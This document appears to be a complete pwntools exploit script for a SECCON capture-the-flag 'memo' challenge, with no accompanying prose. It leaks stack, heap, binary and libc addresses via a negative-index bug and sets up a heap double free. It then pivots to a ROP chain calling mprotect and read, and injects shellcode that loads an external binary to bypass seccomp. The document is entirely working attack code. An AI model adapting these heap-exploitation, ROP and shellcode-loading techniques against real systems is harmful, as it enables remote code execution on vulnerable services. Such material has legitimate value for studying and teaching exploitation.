from pwn import *

binary = './memo'
libc_path = './libc-2.23.so'

p = remote('smemo.pwn.seccon.jp', 36384)

elf = ELF(binary, False)
libc = ELF(libc_path, False)

MAX_LEN = 0x28
prompt = '>'

def add(msg):
    p.sendlineafter(prompt, '1')
    p.sendafter('Input memo >', msg)
    p.recvuntil('Added id:')

def show(id_str):
    p.sendlineafter(prompt, '2')
    p.sendlineafter('Input id > ', id_str)
    p.recvuntil('Show id:')
    p.recvuntil('\n')
    return p.recvuntil('\n')[:-1]

def remove(id):
    p.sendlineafter(prompt, '3')
    p.sendlineafter('Input id > ', str(id))
    p.recvuntil('Deleted id:')

for i in range(0x9):
    payload = p64(0) * 3 + p64(0x31) + '\n'
    add(payload)

leaked_str = show('-4')
leaked_addr = u64(leaked_str.ljust(8, '\0'))
bufs_ptr = leaked_addr - 0x150
heap_buf = leaked_addr - (0xd0 - 0x40)
exe_ptr =  leaked_addr
log.info('leaked stack: %s' % hex(leaked_addr))
log.info('buf ptr: %s' % hex(bufs_ptr))
log.info('heap buf: %s' % hex(heap_buf))

def do_leak(addr):
    delta = (heap_buf - bufs_ptr) / 8
    delta_str = '%d' % -delta
    payload = ''
    payload += delta_str.ljust(0x10, '\0')
    payload += p64(addr)
    return show(payload)

leaked_str = do_leak(heap_buf)
heap_base = u64(leaked_str.ljust(8, '\0')) - 0x20
log.info('heap_base: %s' % hex(heap_base))

leaked_str = do_leak(exe_ptr)
exe_base = u64(leaked_str.ljust(8, '\0')) - 0x20 - 0x1000
log.info('exe_base: %s' % hex(exe_base))

leaked_str = do_leak(exe_ptr + 8)
libc_base = u64(leaked_str.ljust(8, '\0')) - 0x20830
log.info('libc_base: %s' % hex(libc_base))

def free(addr):
    delta = (heap_buf - bufs_ptr) / 8
    delta_str = '%d' % -delta
    payload = ''
    payload += delta_str.ljust(0x10, '\0')
    payload += p64(addr)
    return remove(payload)

free(heap_base + 0x20)
remove(1)
free(heap_base + 0x20)

target = heap_buf - 0xb8
payload = ''
payload += p64(target)
payload += '\n'

add(payload)
add('AAAAAAAAA\n')
add('AAAAAAAAA\n')

payload = ''
payload += '1'.ljust(8, '\0')
payload += 'B' * 0x8 * 7
payload += p32(0x0)
payload += p32(0x31)
payload += '\n'
p.sendafter(prompt, payload)

'''
0x0019dba5: pop rdi ; ret
0x000202e8: pop rsi ; ret
0x00001b92: pop rdx ; ret
0x000ea69a: pop rcx ; pop rbx ; ret 
0x00135136: pop r8 ; mov eax, 0x00000001 ; ret
0x00110a80: xor r9L, bpl; ret
'''
poprdi = libc_base + 0x19dba5
poprsi = libc_base + 0x202e8
poprdx = libc_base + 0x1b92
poprcx2 = libc_base + 0xea69a
popr8 = libc_base + 0x135136
xorr9L = libc_base + 0x110a80
gets = libc_base + libc.symbols['gets']
mprotect = libc_base + libc.symbols['mprotect']
read = libc_base + libc.symbols['read']
write = libc_base + libc.symbols['write']
mmap = libc_base + libc.symbols['mmap']
binsh = libc_base + 0x0018cd57

payload = ''
payload += 'A' * 0x10
payload += p64(poprdi)
payload += p64(target + 0x30)
payload += p64(gets)[:7]
p.sendafter('Input memo >', payload)

canvas = exe_base + 0x1000

payload = ''
payload += 'C' * 8

payload += p64(poprdi)
payload += p64(canvas)
payload += p64(poprsi)
payload += p64(0x1000)
payload += p64(poprdx)
payload += p64(0x7)
payload += p64(mprotect)

payload += p64(poprdi)
payload += p64(0x0)
payload += p64(poprsi)
payload += p64(canvas)
payload += p64(poprdx)
payload += p64(0x1000)
payload += p64(read)

payload += p64(canvas)
payload += 'A' * 0x10
payload += '\n'
p.send(payload)

stack = 0x4000000
stack_len = 0x21000
shellcode = asm('''
mov r9, 0
mov r8, 0xffffffffffffffff
mov rcx, 34
mov rdx, 7
mov rsi, %s
mov rdi, %s
mov rax, %s
call rax

mov r9, 0
mov r8, 0xffffffffffffffff
mov rcx, 34
mov rdx, 7
mov rsi, 0xca000
mov rdi, 0x400000
mov rax, %s
call rax

mov rdi, 0x1
mov rsi, %s
mov rdx, 8
mov rax, %s
call rax

mov rbx, 0x0
mov r9, 0xca000
L1:
mov rdi, 0x0
mov rsi, 0x400000
add rsi, rbx
mov rdx, 0xca000
mov rax, %s
call rax
add rbx, rax
cmp rbx, r9
jl L1

mov r9, 0
mov r8, 0xffffffffffffffff
mov rcx, 34
mov rdx, 7
mov rsi, 0x28000
mov rdi, 0x6c9000
mov rax, %s
call rax

mov rdi, 0x1
mov rsi, %s
mov rdx, 8
mov rax, %s
call rax

mov rbx, 0x0
mov r9, 0x3000
L2:
mov rdi, 0x0
mov rsi, 0x6c9000
add rsi, rbx
mov rdx, 0x3000
mov rax, %s
call rax
add rbx, rax
cmp rbx, r9
jl L2

mov rax, 0x0
mov rbx, 0x0
mov rcx, 0x0
mov rdx, 0x0
mov rsi, 0x0
mov rdi, 0x0
mov rbp, 0x0
mov rsp, %s
mov r8 , 0x0
mov r9 , 0x0
mov r10, 0x0
mov r11, 0x0
mov r12, 0x0
mov r13, 0x0
mov r14, 0x0
mov r15, 0x0

mov rbp, 0x4005e6
jmp rbp
''' % (hex(stack), hex(stack_len), hex(mmap), hex(mmap), hex(binsh), hex(write), hex(read), hex(mmap), hex(binsh), hex(write), hex(read), hex(stack+stack_len/2)), arch='amd64', os='linux', vma=canvas)


with open('./bypass_seccomp_text', 'rb') as fp:
    exploit_text_area = fp.read()

with open('./bypass_seccomp_bss', 'rb') as fp:
    exploit_bss_area = fp.read()

p.send(shellcode)
chunk_size = 0x100

log.info("Sending executable... (length: %s)" % hex(len(exploit_text_area)))
sent = 0
p.recvuntil('/bin/sh')
while sent < 0xca000:
    p.send(exploit_text_area[sent:sent+chunk_size])
    sent += chunk_size
    log.info('%s bytes sent' % hex(sent))
log.info("Done.")

log.info("Sending data... (length: %s)" % hex(len(exploit_bss_area)))
sent = 0
p.recvuntil('/bin/sh')
while sent < 0x3000:
    p.send(exploit_bss_area[sent:sent+chunk_size])
    sent += chunk_size
    log.info('%s bytes sent' % hex(sent))
log.info("Done.")

ans = p.recvall()
print 'Ans: %s' % ans
